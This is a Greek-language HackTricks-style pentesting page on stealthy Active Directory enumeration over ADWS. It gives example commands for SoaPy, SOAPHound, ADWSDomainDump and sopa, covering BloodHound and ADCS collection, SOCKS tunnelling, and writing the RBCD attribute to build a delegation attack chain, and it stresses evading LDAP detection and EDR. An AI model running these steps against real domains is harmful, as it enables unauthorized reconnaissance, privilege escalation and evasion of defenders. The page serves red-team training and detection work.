# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Τι είναι το ADWS;

Active Directory Web Services (ADWS) είναι **ενεργοποιημένο από προεπιλογή σε κάθε Domain Controller από τα Windows Server 2008 R2 και μετά** και ακούει στο TCP **9389**. Παρά το όνομα, **δεν εμπλέκεται HTTP**. Αντίθετα, η υπηρεσία εκθέτει δεδομένα σε στυλ LDAP μέσω μιας στοίβας ιδιόκτητων .NET framing πρωτοκόλλων:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Επειδή η κίνηση είναι ενθυλακωμένη μέσα σε αυτά τα δυαδικά SOAP πλαίσια και ταξιδεύει μέσω μιας ασυνήθιστης θύρας, **η καταγραφή μέσω ADWS είναι πολύ λιγότερο πιθανό να ελεγχθεί, φιλτραριστεί ή να έχει signature σε σχέση με την κλασική LDAP/389 & 636 κίνηση**. Για τους χειριστές αυτό σημαίνει:

* Πιο σιωπηλή αναγνώριση – οι Blue teams συχνά επικεντρώνονται σε LDAP ερωτήματα.
* Δυνατότητα συλλογής από **non-Windows hosts (Linux, macOS)** μέσω tunnelling της 9389/TCP μέσα από SOCKS proxy.
* Τα ίδια δεδομένα που θα λάβετε μέσω LDAP (users, groups, ACLs, schema, κ.λπ.) και η ικανότητα να κάνετε **writes** (π.χ. `msDs-AllowedToActOnBehalfOfOtherIdentity` για **RBCD**).

Οι αλληλεπιδράσεις με το ADWS υλοποιούνται πάνω σε WS-Enumeration: κάθε query ξεκινά με ένα μήνυμα `Enumerate` που ορίζει το LDAP φίλτρο/attributes και επιστρέφει ένα `EnumerationContext` GUID, ακολουθούμενο από ένα ή περισσότερα μηνύματα `Pull` που ρέουν μέχρι το παράθυρο αποτελεσμάτων που ορίζεται από τον server. Τα contexts λήγουν μετά από ~30 λεπτά, οπότε τα εργαλεία είτε πρέπει να σελιδοποιούν τα αποτελέσματα είτε να χωρίζουν τα φίλτρα (prefix queries ανά CN) για να αποφευχθεί η απώλεια κατάστασης. Όταν ζητάτε security descriptors, καθορίστε τον έλεγχο `LDAP_SERVER_SD_FLAGS_OID` για να παραλείψετε τις SACLs, αλλιώς το ADWS απλά αφαιρεί το attribute `nTSecurityDescriptor` από την SOAP απάντηση.

> NOTE: Το ADWS χρησιμοποιείται επίσης από πολλά RSAT GUI/PowerShell εργαλεία, οπότε η κίνηση μπορεί να αναμιχθεί με νόμιμη διαχειριστική δραστηριότητα.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) είναι μια **πλήρης επαν-υλοποίηση της στοίβας πρωτοκόλλου ADWS σε καθαρό Python**. Κατασκευάζει τα NBFX/NBFSE/NNS/NMF frames byte-for-byte, επιτρέποντας συλλογή από Unix-like συστήματα χωρίς να χρειαστεί το .NET runtime.

### Βασικά Χαρακτηριστικά

* Υποστηρίζει **proxying through SOCKS** (χρήσιμο από C2 implants).
* Λεπτομερή φίλτρα αναζήτησης ίδια με το LDAP `-q '(objectClass=user)'`.
* Προαιρετικές **write** λειτουργίες ( `--set` / `--delete` ).
* **BOFHound output mode** για απευθείας εισαγωγή στο BloodHound.
* Σημαία `--parse` για ομορφοποίηση timestamps / `userAccountControl` όταν απαιτείται ανθρώπινη αναγνωσιμότητα.

### Σημαίες στοχευμένης συλλογής & λειτουργίες εγγραφής

Το SoaPy έρχεται με επιμελημένες επιλογές που αναπαράγουν τα πιο κοινά LDAP hunting tasks πάνω σε ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, καθώς και ακατέργαστες `--query` / `--filter` επιλογές για custom pulls. Συνδυάστε τα με primitives εγγραφής όπως `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging για στοχευμένο Kerberoasting) και `--asrep` (flip `DONT_REQ_PREAUTH` στο `userAccountControl`).

Παράδειγμα στοχευμένης αναζήτησης SPN που επιστρέφει μόνο `samAccountName` και `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Χρησιμοποιήστε τον ίδιο host/διαπιστευτήρια για να οπλοποιήσετε αμέσως τα ευρήματα: εξάγετε αντικείμενα με δυνατότητα RBCD με `--rbcds`, και στη συνέχεια εφαρμόστε `--rbcd 'WEBSRV01$' --account 'FILE01$'` για να στήσετε μια Resource-Based Constrained Delegation αλυσίδα (βλέπε [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) για την πλήρη διαδρομή κατάχρησης).

### Εγκατάσταση (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump μέσω ADWS (Linux/Windows)

* Fork του `ldapdomaindump` που αντικαθιστά τα LDAP queries με ADWS calls στο TCP/9389 για να μειώσει τα LDAP-signature hits.
* Εκτελεί έναν αρχικό έλεγχο προσβασιμότητας στην 9389 εκτός εάν περαστεί `--force` (παραλείπει την probe αν τα port scans είναι noisy/filtered).
* Δοκιμάστηκε έναντι Microsoft Defender for Endpoint και CrowdStrike Falcon με επιτυχές bypass στο README.

### Εγκατάσταση
```bash
pipx install .
```
### Χρήση
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Η τυπική έξοδος καταγράφει τον έλεγχο προσβασιμότητας στην θύρα 9389, το ADWS bind, και την έναρξη/λήξη του dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Ένας πρακτικός client για ADWS σε Golang

Παρόμοια με το soapy, [sopa](https://github.com/Macmod/sopa) υλοποιεί το ADWS protocol stack (MS-NNS + MC-NMF + SOAP) σε Golang, εκθέτοντας command-line flags για την αποστολή κλήσεων ADWS όπως:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` και `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* και άλλα όπως `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, κ.α.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) είναι ένας .NET collector που διατηρεί όλες τις LDAP αλληλεπιδράσεις μέσα στο ADWS και εξάγει BloodHound v4-compatible JSON. Δημιουργεί ένα πλήρες cache των `objectSid`, `objectGUID`, `distinguishedName` και `objectClass` μία φορά (`--buildcache`), και μετά το επαναχρησιμοποιεί για υψηλού όγκου διεργασίες `--bhdump`, `--certdump` (ADCS), ή `--dnsdump` (AD-integrated DNS) έτσι ώστε μόνο ~35 κρίσιμα attributes να φεύγουν ποτέ από τον DC. Το AutoSplit (`--autosplit --threshold <N>`) διαχωρίζει αυτόματα τα queries βάσει του CN prefix για να παραμένει κάτω από το 30-minute EnumerationContext timeout σε μεγάλα forests.

Τυπική ροή εργασίας σε ένα domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Τα εξαγόμενα JSON μπορούν να εισαχθούν απευθείας σε SharpHound/BloodHound ροές εργασίας — δείτε τη [BloodHound methodology](bloodhound.md) για ιδέες σχετικά με την απεικόνιση γραφημάτων. Το AutoSplit κάνει το SOAPHound ανθεκτικό σε multi-million object forests, διατηρώντας τον αριθμό των queries χαμηλότερο από ADExplorer-style snapshots.

## Stealth AD Collection Workflow

Η παρακάτω ροή εργασίας δείχνει πώς να enumerate τα **domain & ADCS objects** μέσω ADWS, να τα μετατρέψετε σε BloodHound JSON και να κυνηγήσετε certificate-based attack paths — όλα από Linux:

1. **Tunnel 9389/TCP** από το target network στο μηχάνημά σας (π.χ. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` or use SoaPy’s `--proxyHost/--proxyPort`.

2. **Συλλέξτε το root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Συλλέξτε αντικείμενα σχετικά με το ADCS από το Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Μετατρέψτε σε BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Ανέβασε το ZIP** στο GUI του BloodHound και εκτέλεσε cypher queries όπως `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` για να αποκαλύψεις μονοπάτια κλιμάκωσης πιστοποιητικών (ESC1, ESC8, κ.λπ.).

### Εγγραφή του `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Συνδύασέ το με `s4u2proxy`/`Rubeus /getticket` για μια πλήρη αλυσίδα **Resource-Based Constrained Delegation** (βλ. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Σύνοψη Εργαλείων

| Σκοπός | Εργαλείο | Σημειώσεις |
|--------|---------|-----------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, ανάγνωση/εγγραφή |
| ADWS dump υψηλού όγκου | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| Εισαγωγή στο BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Μετατρέπει logs από SoaPy/ldapsearch |
| Παραβίαση Cert | [Certipy](https://github.com/ly4k/Certipy) | Μπορεί να προωθηθεί μέσω του ίδιου SOCKS |
| ADWS enumeration & αλλαγές αντικειμένων | [sopa](https://github.com/Macmod/sopa) | Γενικός client για σύνδεση με γνωστά ADWS endpoints - επιτρέπει ανίχνευση, δημιουργία αντικειμένων, τροποποιήσεις χαρακτηριστικών και αλλαγές κωδικών πρόσβασης |

## Αναφορές

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
